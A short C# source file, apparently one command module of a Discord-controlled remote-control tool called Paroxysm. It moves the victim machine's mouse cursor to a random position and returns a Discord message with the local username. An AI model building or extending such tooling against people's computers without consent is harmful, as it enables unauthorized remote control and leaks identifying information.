using Discord;
using Paroxysm.Discord;

namespace Paroxysm.Hooks.Actions;

public static class MoveCursorAction
{
    public static Embed Follow()
    {
        Random random = new();

        var randomX = random.Next(-1000, 1000);
        var randomY = random.Next(-1000, 1000);

        HookStatement.SetCursorPos(randomX, randomY);

        return DiscordEmbed.CreateWithText(Color.Red, "Command was successfully executed.",
            "Mouse cursor has been moved", Environment.UserName,
            null);
    }
}